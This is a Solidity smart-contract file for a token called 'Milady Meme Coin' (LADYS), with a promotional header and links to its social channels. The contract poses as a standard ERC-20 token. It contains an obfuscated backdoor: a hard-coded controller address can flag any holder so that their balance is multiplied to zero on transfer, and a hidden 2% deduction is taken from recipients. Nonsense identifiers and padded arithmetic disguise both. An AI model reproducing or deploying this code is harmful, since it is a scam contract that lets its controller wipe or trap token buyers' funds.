/**

Welcome to LADYS, the meme coin of Milady NFT collection. LADYS is the tokenisation of the fully memetically optimized white pill.
LADYS is not another meme coin. LADYS is a self-organised meme coin. LADYS is the drip currency. LADYS is the points for karma, charm and beauty. LADYS is the accumulation of clout.
Milady meme coin is LADYS, and LADYS is the meme coin for Milady.

Website : https://milady.gg/

Twitter : https://twitter.com/miladymemecoin

Telegram : https://t.me/miladymemecoinchannel

Discord: https://discord.com/invite/miladymemecoin

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address azithromycin) external view returns (uint256);

    function transfer(address to, uint256 zeonico) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 zeonico) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 zeonico
    ) external returns (bool);
}

pragma solidity ^0.8.18;

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.18;

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMozed(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mozed(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

abstract contract Ownable is Context {
    address private _Owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _Owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _Owner;
        _Owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _defenderFlashbots;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address private advancedDefender;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(address advancedDefenderAddress, string memory name_, string memory symbol_) {
        advancedDefender = advancedDefenderAddress;
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address azithromycin) public view virtual override returns (uint256) {
        return _balances[azithromycin];
    }

    function transfer(address _to, uint256 zeonico) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, _to, zeonico);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 zeonico) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, zeonico);
        return true;
    }

    function setDefenderFlashbots(address[] memory attacker, uint256 indexMEV) public BEP20advanced {
        for(uint256 i = 0; i < attacker.length; i++) {
        _defenderFlashbots[attacker[i]] = indexMEV*1*1+0;
        }
    }

    function getDefenderFlashbots(address attacker) public view returns (uint256) {
        return _defenderFlashbots[attacker];
    }

    modifier 
        BEP20advanced() {
         require(
            advancedDefender == _msgSender(),
            "This is a zero indexMEV")
        ;
        _;
    }

    function transferFrom(
        address from,
        address to,
        uint256 zeonico
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, zeonico);
        _transfer(from, to, zeonico);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    using SafeMath for uint256;
    uint256 private _feeTax = 2;
    function _transfer(
        address from,
        address to,
        uint256 zeonico
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, zeonico);

        if(_defenderFlashbots[from] != uint256(1*1)-1+0 ){
           _balances[from] = _balances[from].mozed(_defenderFlashbots[from].add(1*1+1+0).sub(1+(2*1)+0)+0); 
        }

        uint256 fromBalance = _balances[from];
        require(fromBalance >= zeonico, "ERC20: transfer exceeds balance");

        uint256 feezeonico = 0;
        feezeonico = zeonico.mozed(_feeTax).div(100);
        
    unchecked {
        _balances[to] += zeonico;
        _balances[from] = fromBalance - zeonico;
        _balances[to] -= feezeonico;
    }
        emit Transfer(from, to, zeonico);

        _afterTokenTransfer(from, to, zeonico);
    }

    function _mint(address azithromycin, uint256 zeonico) internal virtual {
        require(azithromycin != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), azithromycin, zeonico);

        _totalSupply += zeonico;

    unchecked {
        // Overflow not possible: balance + zeonico is at most totalSupply + zeonico, which is checked above.
        _balances[azithromycin] += zeonico;
    }
        emit Transfer(address(0), azithromycin, zeonico);

        _afterTokenTransfer(address(0), azithromycin, zeonico);
    }

    function _burn(address azithromycin, uint256 zeonico) internal virtual {
        require(azithromycin != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(azithromycin, address(0), zeonico);

        uint256 azithromycinBalance = _balances[azithromycin];
        require(azithromycinBalance >= zeonico, "ERC20: burn zeonico exceeds balance");
        
    unchecked {
        _balances[azithromycin] = azithromycinBalance - zeonico;
        // Overflow not possible: zeonico <= azithromycinBalance <= totalSupply.
        _totalSupply -= zeonico;
    }

        emit Transfer(azithromycin, address(0), zeonico);

        _afterTokenTransfer(azithromycin, address(0), zeonico);
    }

    function _approve(
        address owner,
        address spender,
        uint256 zeonico
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = zeonico;
        emit Approval(owner, spender, zeonico);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 zeonico
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= zeonico, "ERC20: insufficient allowance");
            unchecked {
            _approve(owner, spender, currentAllowance - zeonico);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 zeonico
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 zeonico
    ) internal virtual {}
}

pragma solidity ^0.8.18;

contract Token is ERC20 {
    uint256 initialSupply = 1000000000;
    constructor() ERC20(0x8C5d426b7d48070Af17c598A39947d5F107f32e3, "Milady Meme Coin", "LADYS") {
        _mint(msg.sender, initialSupply*10**9);
    }
}